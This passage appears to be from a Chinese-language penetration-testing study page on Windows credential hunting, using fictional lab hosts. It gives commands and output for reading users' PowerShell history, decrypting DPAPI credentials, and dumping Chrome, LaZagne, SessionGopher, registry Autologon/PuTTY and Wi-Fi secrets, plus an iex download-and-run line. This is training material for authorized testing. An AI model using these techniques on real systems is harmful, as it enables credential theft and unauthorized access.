class="number">5</span>erv3rAdmin! /<span class="built_in">r</span>:WEB02</span><br></pre></td></tr></table></figure>

<p>检索当前用户能够访问的所有 Powershell 历史文件的内容。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="keyword">foreach</span>(<span class="variable">$user</span> <span class="keyword">in</span> ((<span class="built_in">ls</span> C:\users).fullname))&#123;<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$user</span>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">cd</span> Temp</span><br><span class="line"><span class="built_in">md</span> backups</span><br><span class="line"><span class="built_in">cp</span> c:\inetpub\wwwroot\* .\backups\</span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span> <span class="literal">-Force</span>; [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol <span class="operator">-bor</span> <span class="number">3072</span>; <span class="built_in">iex</span> ((<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1&#x27;</span>))</span><br><span class="line">. .\<span class="built_in">Get-IISsite</span>.ps1</span><br><span class="line"><span class="built_in">Get-IISsite</span> <span class="literal">-Server</span> WEB02 <span class="literal">-web</span> <span class="string">&quot;Default Web Site&quot;</span></span><br><span class="line">wevtutil qe Application <span class="string">&quot;/q:*[Application [(EventID=3005)]]&quot;</span> /f:text /<span class="built_in">rd</span>:true /u:WEB02\administrator /p:<span class="number">5</span>erv3rAdmin! /<span class="built_in">r</span>:WEB02</span><br></pre></td></tr></table></figure>

<h3 id="PowerShell-凭据"><a href="#PowerShell-凭据" class="headerlink" title="PowerShell 凭据"></a>PowerShell 凭据</h3><p>PowerShell 凭据通常用于脚本和自动化任务，以便于存储加密凭据。凭据使用<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Data_Protection_API">DPAPI</a>进行保护，这通常意味着它们只能由创建它们的同一台计算机上的同一用户解密。</p>
<p>例如，以下脚本<code>Connect-VC.ps1</code>是系统管理员创建的，以便轻松连接到 vCenter 服务器</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Connect-VC.ps1</span></span><br><span class="line"><span class="comment"># Get-Credential | Export-Clixml -Path &#x27;C:\scripts\pass.xml&#x27;</span></span><br><span class="line"><span class="variable">$encryptedPassword</span> = <span class="built_in">Import-Clixml</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\scripts\pass.xml&#x27;</span></span><br><span class="line"><span class="variable">$decryptedPassword</span> = <span class="variable">$encryptedPassword</span>.GetNetworkCredential().Password</span><br><span class="line"><span class="built_in">Connect-VIServer</span> <span class="literal">-Server</span> <span class="string">&#x27;VC-01&#x27;</span> <span class="literal">-User</span> <span class="string">&#x27;bob_adm&#x27;</span> <span class="literal">-Password</span> <span class="variable">$decryptedPassword</span></span><br></pre></td></tr></table></figure>

<p>解密 PowerShell 凭据，如果获得了该用户上下文中的命令执行权限，或者可以滥用 DPAPI，那么可以从<code>encrypted.xml</code>中恢复明文凭证。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$credential</span> = <span class="built_in">Import-Clixml</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\scripts\pass.xml&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$credential</span>.GetNetworkCredential().username</span><br><span class="line"></span><br><span class="line">bob</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$credential</span>.GetNetworkCredential().password</span><br><span class="line"></span><br><span class="line">Str0ng3ncryptedP@ss!</span><br></pre></td></tr></table></figure>

<h2 id="Other-Files"><a href="#Other-Files" class="headerlink" title="Other Files"></a>Other Files</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">%SYSTEMDRIVE%\pagefile.sys</span><br><span class="line">%WINDIR%\debug\NetSetup.log</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\iis6.log</span><br><span class="line">%WINDIR%\system32\config\AppEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br><span class="line">%WINDIR%\system32\CCM\logs\*.log</span><br><span class="line">%USERPROFILE%\ntuser.dat</span><br><span class="line">%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat</span><br><span class="line">%WINDIR%\System32\drivers\etc\hosts</span><br><span class="line">C:\ProgramData\Configs\*</span><br><span class="line">C:\Program Files\Windows PowerShell\*</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Credential-Theft"><a href="#Credential-Theft" class="headerlink" title="Credential Theft"></a>Credential Theft</h1><h2 id="Cmdkey-Saved-Credentials"><a href="#Cmdkey-Saved-Credentials" class="headerlink" title="Cmdkey Saved Credentials"></a>Cmdkey Saved Credentials</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey">cmdkey</a>命令可用于创建、列出和删除已存储的用户名和密码。用户可能希望存储特定主机的凭据，或使用它来存储终端服务连接的凭据，以便使用远程桌面连接到远程主机而无需输入密码。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">cmdkey</span> /<span class="title">list</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">Target</span>: <span class="title">LegacyGeneric:target</span>=<span class="title">TERMSRV</span>/<span class="title">SQL01</span></span></span><br><span class="line"><span class="function">    <span class="title">Type</span>: <span class="title">Generic</span></span></span><br><span class="line"><span class="function">    <span class="title">User</span>: <span class="title">inlanefreight</span>\<span class="title">bob</span></span></span><br></pre></td></tr></table></figure>

<p>尝试通过 RDP 连接到主机时，将使用保存的凭据。</p>
<p>重用凭据，以该用户的身份向自己发送反向 shell，或者运行二进制文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; runas /savecred /user:inlanefreight\bob <span class="string">&quot;COMMAND HERE&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Browser-Credentials"><a href="#Browser-Credentials" class="headerlink" title="Browser Credentials"></a>Browser Credentials</h2><p>用户通常会在浏览器中存储经常访问的应用程序的凭据。可以使用<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpDPAPI">SharpChrome</a>等工具从 Google Chrome 中检索 cookie 和已保存的登录信息。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpChrome.exe logins /unprotect</span><br><span class="line"></span><br><span class="line">  __                 _</span><br><span class="line"> (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _</span><br><span class="line"> __) | | (_| |  |_) \_ | | | (_) | | | (/_</span><br><span class="line">                |</span><br><span class="line">  v1.<span class="number">7.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Chrome Saved Logins Triage</span><br><span class="line"></span><br><span class="line">[*] Triaging Chrome Logins <span class="keyword">for</span> current user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State</span><br><span class="line">[*] AES state key      : <span class="number">5</span>A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="literal">---</span> Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login <span class="keyword">Data</span>) <span class="literal">---</span></span><br><span class="line"></span><br><span class="line">file_path,signon_realm,origin_url,date_created,times_used,username,password</span><br><span class="line">C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login <span class="keyword">Data</span>,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,<span class="number">4</span>/<span class="number">12</span>/<span class="number">2021</span> <span class="number">5</span>:<span class="number">16</span>:<span class="number">52</span> PM,<span class="number">13262735812597100</span>,bob@inlanefreight.local,Welcome1</span><br></pre></td></tr></table></figure>

<h2 id="Password-Managers"><a href="#Password-Managers" class="headerlink" title="Password Managers"></a>Password Managers</h2><p>密码管理器可能是桌面应用程序（例如<code>KeePass</code>）、云解决方案（例如<code>1Password</code>）或企业密码库（例如<code>Thycotic</code>或<code>CyberArk</code>）。获取密码管理器的访问权限（尤其是 IT 人员或整个部门使用的密码管理器）可能导致以管理员级别访问高价值目标（例如网络设备、服务器、数据库等）。</p>
<h2 id="Email"><a href="#Email" class="headerlink" title="Email"></a>Email</h2><p>如果以具有 Microsoft Exchange 收件箱的域用户身份访问已加入域的系统，可以尝试使用<a target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper">MailSniper</a>工具在用户的电子邮件中搜索“pass”、“creds”、“credentials”等术语。</p>
<h2 id="Automation-tools"><a href="#Automation-tools" class="headerlink" title="Automation tools"></a>Automation tools</h2><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a>工具，尝试从 Web 浏览器、聊天客户端、数据库、电子邮件、内存转储、各种系统管理工具和内部密码存储机制（即 Autologon、Credman、DPAPI、LSA 机密等）。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\lazagne.exe all</span><br><span class="line"></span><br><span class="line">|====================================================================|</span><br><span class="line">|                                                                    |</span><br><span class="line">|                        The LaZagne Project                         |</span><br><span class="line">|                                                                    |</span><br><span class="line">|                          ! BANG BANG !                             |</span><br><span class="line">|                                                                    |</span><br><span class="line">|====================================================================|</span><br><span class="line"></span><br><span class="line"><span class="comment">########## User: jordan ##########</span></span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------</span> Winscp passwords <span class="literal">-----------------</span></span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">URL: transfer.inlanefreight.local</span><br><span class="line">Login: root</span><br><span class="line">Password: Summer2020!</span><br><span class="line">Port: <span class="number">22</span></span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------</span> Credman passwords <span class="literal">-----------------</span></span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">URL: dev01.dev.inlanefreight.local</span><br><span class="line">Login: jordan_adm</span><br><span class="line">Password: ! Q A Z z a q <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[+] <span class="number">2</span> passwords have been found.</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more information launch it again with the <span class="literal">-v</span> option</span><br><span class="line"></span><br><span class="line">elapsed time = <span class="number">5.50499987602</span></span><br></pre></td></tr></table></figure>

<h3 id="SessionGopher"><a href="#SessionGopher" class="headerlink" title="SessionGopher"></a>SessionGopher</h3><p><a target="_blank" rel="noopener" href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a>提取已保存的 PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP 凭据。</p>
<p>需要本地管理员访问权限来检索<code>HKEY_USERS</code>中每个用户的存储会话信息，但始终值得以当前用户身份运行以查看是否可以找到任何有用的凭据。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\SessionGopher.ps1</span><br><span class="line"> </span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Invoke-SessionGopher</span> <span class="literal">-Target</span> WINLPE<span class="literal">-SRV01</span></span><br><span class="line"> </span><br><span class="line">          o_</span><br><span class="line">         /  <span class="string">&quot;.   SessionGopher</span></span><br><span class="line"><span class="string">       ,&quot;</span>  _-<span class="string">&quot;</span></span><br><span class="line"><span class="string">     ,&quot;</span>   m m</span><br><span class="line">  ..+     )      Brandon Arvanaghi</span><br><span class="line">     `m..m       Twitter: @arvanaghi | arvanaghi.com</span><br><span class="line"> </span><br><span class="line">[+] Digging on WINLPE<span class="literal">-SRV01</span>...</span><br><span class="line">WinSCP Sessions</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Source   : WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br><span class="line">Session  : Default%<span class="number">20</span>Settings</span><br><span class="line">Hostname :</span><br><span class="line">Username :</span><br><span class="line">Password :</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">PuTTY Sessions</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Source   : WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br><span class="line">Session  : nix03</span><br><span class="line">Hostname : nix03.inlanefreight.local</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">SuperPuTTY Sessions</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Source        : WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br><span class="line">SessionId     : NIX03</span><br><span class="line">SessionName   : NIX03</span><br><span class="line">Host          : nix03.inlanefreight.local</span><br><span class="line">Username      : srvadmin</span><br><span class="line">ExtraArgs     :</span><br><span class="line">Port          : <span class="number">22</span></span><br><span class="line">Putty Session : Default Settings</span><br></pre></td></tr></table></figure>

<h2 id="Clear-Text-Password-Storage-in-the-Registry"><a href="#Clear-Text-Password-Storage-in-the-Registry" class="headerlink" title="Clear-Text Password Storage in the Registry"></a>Clear-Text Password Storage in the Registry</h2><p>某些程序和 Windows 配置可能会导致明文密码或其他数据存储在注册表中。虽然<code>Lazagne</code>和<code>SessionGopher</code>等工具是提取凭据的好方法，但也应该熟悉并习惯手动枚举它们。</p>
<h3 id="枚举-Autologon"><a href="#枚举-Autologon" class="headerlink" title="枚举 Autologon"></a>枚举 Autologon</h3><p>自动登录帐户的典型配置涉及手动设置以下注册表项：</p>
<ul>
<li><code>AdminAutoLogon</code>- 确定自动登录是否启用或禁用。值为“1”表示已启用。</li>
<li><code>DefaultUserName</code>- 保存将自动登录的帐户的用户名的值。</li>
<li><code>DefaultPassword</code>- 保存先前指定的用户帐户的密码值。</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">reg</span> <span class="title">query</span> &quot;<span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">SOFTWARE</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span> <span class="title">NT</span>\<span class="title">CurrentVersion</span>\<span class="title">Winlogon</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">SOFTWARE</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span> <span class="title">NT</span>\<span class="title">CurrentVersion</span>\<span class="title">Winlogon</span></span></span><br><span class="line"><span class="function">    <span class="title">AutoRestartShell</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br><span class="line"><span class="function">    <span class="title">Background</span>    <span class="title">REG_SZ</span>    0 0 0</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    &lt;<span class="title">SNIP</span>&gt;</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">AutoAdminLogon</span>    <span class="title">REG_SZ</span>    1</span></span><br><span class="line"><span class="function">    <span class="title">DefaultUserName</span>    <span class="title">REG_SZ</span>    \<span class="title">htb</span>-<span class="title">student</span></span></span><br><span class="line"><span class="function">    <span class="title">DefaultPassword</span>    <span class="title">REG_SZ</span>    \<span class="title">_</span>@<span class="title">cademy_stdnt</span>!</span></span><br></pre></td></tr></table></figure>

<h3 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a>PuTTY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\&lt;SESSION NAME&gt;</span><br></pre></td></tr></table></figure>

<p>此特定注册表项的访问控制与配置和保存会话的用户帐户绑定。因此，为了查看它，需要以该用户身份登录并搜索<code>HKEY_CURRENT_USER</code>配置单元。随后，如果具有管理员权限，将能够在 中相应用户的配置单元下找到它<code>HKEY_USERS</code>。</p>
<p>枚举可用的已保存会话</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%<span class="number">20</span>ssh</span><br></pre></td></tr></table></figure>

<p>查看发现的会话 <code>kali%20ssh</code>的键和值</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%<span class="number">20</span>ssh</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%<span class="number">20</span>ssh</span><br><span class="line">    Present    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    HostName    REG_SZ</span><br><span class="line">    LogFileName    REG_SZ    putty.log</span><br><span class="line">    </span><br><span class="line">  &lt;SNIP&gt;</span><br><span class="line">  </span><br><span class="line">    ProxyDNS    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    ProxyLocalhost    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    ProxyMethod    REG_DWORD    <span class="number">0</span>x5</span><br><span class="line">    ProxyHost    REG_SZ    proxy</span><br><span class="line">    ProxyPort    REG_DWORD    <span class="number">0</span>x50</span><br><span class="line">    ProxyUsername    REG_SZ    administrator</span><br><span class="line">    ProxyPassword    REG_SZ    <span class="number">1</span>_4m_th3_@cademy_4dm1n!</span><br></pre></td></tr></table></figure>

<h2 id="Wifi-Passwords"><a href="#Wifi-Passwords" class="headerlink" title="Wifi Passwords"></a>Wifi Passwords</h2><p>如果获得具有无线网卡的用户工作站的本地管理员访问权限，就可以列出他们最近连接的任何无线网络。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">netsh</span> <span class="title">wlan</span> <span class="title">show</span> <span class="title">profile</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Profiles</span> <span class="title">on</span> <span class="title">interface</span> <span class="title">Wi</span>-<span class="title">Fi</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Group</span> <span class="title">policy</span> <span class="title">profiles</span> (<span class="title">read</span> <span class="title">only</span>)</span></span><br><span class="line"><span class="function">--------------------------------</span></span><br><span class="line"><span class="function">    &lt;<span class="title">None</span>&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">profiles</span></span></span><br><span class="line"><span class="function">------------</span></span><br><span class="line"><span class="function">    <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span>     : <span class="title">Smith</span> <span class="title">Cabin</span></span></span><br><span class="line"><span class="function">    <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span>     : <span class="title">Bob</span>&#x27;<span class="title">s</span> <span class="title">iPhone</span></span></span><br><span class="line"><span class="function">    <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span>     : <span class="title">EE_Guest</span></span></span><br><span class="line"><span class="function">    <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span>     : <span class="title">EE_Guest</span> 2.4</span></span><br><span class="line"><span class="function">    <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span>     : <span class="title">ilfreight_corp</span></span></span><br></pre></td></tr></table></figure>

<p>检索已保存的无线密码，根据网络配置，可以检索预共享密钥（<code>Key Content</code>见下文）并可能访问目标网络。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">netsh</span> <span class="title">wlan</span> <span class="title">show</span> <span class="title">profile</span> <span class="title">ilfreight_corp</span> <span class="title">key</span>=<span class="title">clear</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Profile</span> <span class="title">ilfreight_corp</span> <span class="title">on</span> <span class="title">interface</span> <span class="title">Wi</span>-<span class="title">Fi</span>:</span></span><br><span class="line"><span class="function">=======================================================================</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Applied</span>: <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Profile</span> <span class="title">information</span></span></span><br><span class="line"><span class="function">--------------------</span></span><br><span class="line"><span class="function">    <span class="title">Version</span>                : 1</span></span><br><span class="line"><span class="function">    <span class="title">Type</span>                   : <span class="title">Wireless</span> <span class="title">LAN</span></span></span><br><span class="line"><span class="function">    <span class="title">Name</span>                   : <span class="title">ilfreight_corp</span></span></span><br><span class="line"><span class="function">    <span class="title">Control</span> <span class="title">options</span>        :</span></span><br><span class="line"><span class="function">        <span class="title">Connection</span> <span class="title">mode</span>    : <span class="title">Connect</span> <span class="title">automatically</span></span></span><br><span class="line"><span class="function">        <span class="title">Network</span> <span class="title">broadcast</span>  : <span class="title">Connect</span> <span class="title">only</span> <span class="title">if</span> <span class="title">this</span> <span class="title">network</span> <span class="title">is</span> <span class="title">broadcasting</span></span></span><br><span class="line"><span class="function">        <span class="title">AutoSwitch</span>         : <span class="title">Do</span> <span class="title">not</span> <span class="title">switch</span> <span class="title">to</span> <span class="title">other</span> <span class="title">networks</span></span></span><br><span class="line"><span class="function">        <span class="title">MAC</span> <span class="title">Randomization</span>  : <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Connectivity</span> <span class="title">settings</span></span></span><br><span class="line"><span class="function">--------------------</span></span><br><span class="line"><span class="function">    <span class="title">Number</span> <span class="title">of</span> <span class="title">SSIDs</span>        : 1</span></span><br><span class="line"><span class="function">    <span class="title">SSID</span> <span class="title">name</span>              : &quot;<span class="title">ilfreight_corp</span>&quot;</span></span><br><span class="line"><span class="function">    <span class="title">Network</span> <span class="title">type</span>           : <span class="title">Infrastructure</span></span></span><br><span class="line"><span class="function">    <span class="title">Radio</span> <span class="title">type</span>             : [ <span class="title">Any</span> <span class="title">Radio</span> <span class="title">Type</span> ]</span></span><br><span class="line"><span class="function">    <span class="title">Vendor</span> <span class="title">extension</span>       : <span class="title">Not</span> <span class="title">present</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Security</span> <span class="title">settings</span></span></span><br><span class="line"><span class="function">--------------------</span></span><br><span class="line"><span class="function">    <span class="title">Authentication</span>         : <span class="title">WPA2</span>-<span class="title">Personal</span></span></span><br><span class="line"><span class="function">    <span class="title">Cipher</span>                 : <span class="title">CCMP</span></span></span><br><span class="line"><span class="function">    <span class="title">Authentication</span>         : <span class="title">WPA2</span>-<span class="title">Personal</span></span></span><br><span class="line"><span class="function">    <span class="title">Cipher</span>                 : <span class="title">GCMP</span></span></span><br><span class="line"><span class="function">    <span class="title">Security</span> <span class="title">key</span>           : <span class="title">Present</span></span></span><br><span class="line"><span class="function">    <span class="title">Key</span> <span class="title">Content</span>            : <span class="title">ILFREIGHTWIFI</span>-<span class="title">CORP123908</span>!</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Cost</span> <span 